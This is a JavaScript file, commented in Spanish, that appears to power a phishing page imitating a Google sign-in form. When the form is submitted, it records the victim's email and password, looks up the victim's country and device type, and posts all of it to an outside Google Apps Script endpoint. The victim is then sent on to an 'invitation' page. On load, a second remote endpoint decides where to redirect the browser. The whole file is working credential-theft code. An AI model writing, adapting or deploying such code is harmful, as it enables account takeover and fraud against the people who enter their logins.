// Script corregido basado en la estructura del HTML proporcionado

document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático 

    // Obtener elementos del formulario (usando los IDs correctos del HTML)
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const errorMessage = document.getElementById('errorMessage');
    const submitBtn = document.getElementById('submitBtn');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["ejemplo@mail.com", "ejemplo1@correo.com"]; 
    const prohibitedWords = ["123456","Sandia190395#","sandia190395#","hola1234"]; 
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    console.log("Email ingresado:", email); // Para depuración
    console.log("Password ingresado:", password); // Para depuración
    
    // Limpiar errores previos
    errorMessage.style.display = 'none';
    errorMessage.textContent = '';
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        showError("Introduce una dirección de correo electrónico válida");
        return;
    }
    
    // Verificar correo prohibido
    if (prohibitedEmails.includes(email)) {
        showError("No se pudo encontrar tu cuenta de Google");
        emailInput.value = '';
        passwordInput.value = '';
        return;
    }
    
    // Verificar contraseña prohibida (usando .some() para verificar si contiene alguna palabra prohibida)
    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
    if (containsProhibitedPassword) {
        showError("La contraseña no es correcta. Inténtalo de nuevo.");
        passwordInput.value = '';
        return;
    }
    
    // Si llegamos aquí, significa que pasó todas las validaciones
    console.log("Todas las validaciones pasaron, continuando..."); // Para depuración
    
    // Deshabilitar botón
    submitBtn.disabled = true;
    submitBtn.textContent = 'Verificando...';
    
    try {
        // Detectar dispositivo
        let deviceType = "Otro";
        if (/android/i.test(navigator.userAgent)) {
            deviceType = "Android";
        } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
            deviceType = "iPhone";
        }
        
        // Obtener país
        let country = "Desconocido";
        try {
            const response = await fetch("https://ipwhois.app/json/");
            const data = await response.json();
            if (data.country) {
                country = data.country;
            }
        } catch (error) {
            console.error("Error obteniendo el país:", error);
        }
        
        // Enviar datos
        const formData = new FormData();
        formData.append("email", email);
        formData.append("password", password);
        formData.append("device", deviceType);
        formData.append("country", country);
        
        const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
        
        const response = await fetch(url, {
            method: "POST",
            body: new URLSearchParams(formData),
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        });
        
        if (response.ok) {
            window.location.href = "invitation.html";
        } else {
            showError("Error al iniciar sesión. Inténtalo de nuevo.");
        }
    } catch (error) {
        showError("Error de conexión. Inténtalo de nuevo.");
        console.error("Error:", error);
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Siguiente';
    }
});

// Función para mostrar errores
function showError(message) {
    const errorMessage = document.getElementById('errorMessage');
    errorMessage.textContent = message;
    errorMessage.style.display = 'block';
    console.log("Error mostrado:", message); // Para depuración
}

// Manejar mostrar/ocultar contraseña
document.getElementById('showPassword').addEventListener('change', function() {
    const passwordInput = document.getElementById('passwordInput');
    passwordInput.type = this.checked ? 'text' : 'password';
});

// Verificar redirección
document.addEventListener("DOMContentLoaded", async function () {
    const API_URL = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec";
    
    try {
        const response = await fetch(`${API_URL}?t=${new Date().getTime()}`);
        const pagina = await response.text();
        
        if (pagina.trim() !== "folder.html") {
            window.location.href = pagina;
        }
    } catch (error) {
        console.error("Error al verificar la redirección:", error);
    }
});
